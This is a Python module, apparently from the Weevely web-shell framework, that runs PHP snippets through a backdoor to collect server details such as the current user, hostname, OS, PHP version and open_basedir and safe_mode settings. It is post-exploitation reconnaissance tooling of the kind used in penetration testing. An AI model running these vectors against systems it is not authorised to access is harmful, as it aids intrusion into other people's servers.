from core.vector import PhpCmd
from core.module import Module
from core import messages
import random


class Info(Module):

    """Collect system information."""

    def init(self):

        self._register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self._register_arguments(
            optional = {
                'info': '' # Comma separated information to request
            },
            vector_argument = 'info')

        self._register_vectors(
            [
            PhpCmd("print(@$_SERVER['DOCUMENT_ROOT']);", 'document_root'),
            PhpCmd("$u=@posix_getpwuid(@posix_geteuid());if($u){$u=$u['name'];} else{$u=getenv('username');} print($u);", 'whoami'),
            PhpCmd("print(@gethostname());", 'hostname'),
            PhpCmd("@print(getcwd());", 'cwd'),
            PhpCmd("$v=@ini_get('open_basedir'); if($v) print($v);", 'open_basedir'),
            PhpCmd("(@ini_get('safe_mode') && print(1)) || print(0);", 'safe_mode',
             postprocess = lambda x: True if x=='1' else False
            ),
            PhpCmd("print(@$_SERVER['SCRIPT_NAME']);", 'script'),
            PhpCmd("print(@php_uname());", 'uname'),
            PhpCmd("print(@php_uname('s'));", 'os'),
            PhpCmd("print(@$_SERVER['REMOTE_ADDR']);", 'client_ip'),
            PhpCmd('print(@ini_get("max_execution_time"));', 'max_execution_time',
             postprocess = lambda x: int(x)
            ),
            PhpCmd('print(@$_SERVER["PHP_SELF"]);', 'php_self'),
            PhpCmd('@print(DIRECTORY_SEPARATOR);', 'dir_sep'),
            PhpCmd("$v=''; if(function_exists( 'phpversion' )) { $v=phpversion(); } elseif(defined('PHP_VERSION')) { $v=PHP_VERSION; } elseif(defined('PHP_VERSION_ID')) { $v=PHP_VERSION_ID; } print($v);", 'php_version')
            ]
        )

    def run(self, args):

        return self.vectors.get_results(
         names = args['info'].split(','),
         names_to_store_result = ['whoami', 'hostname', 'dir_sep', 'os']
         )
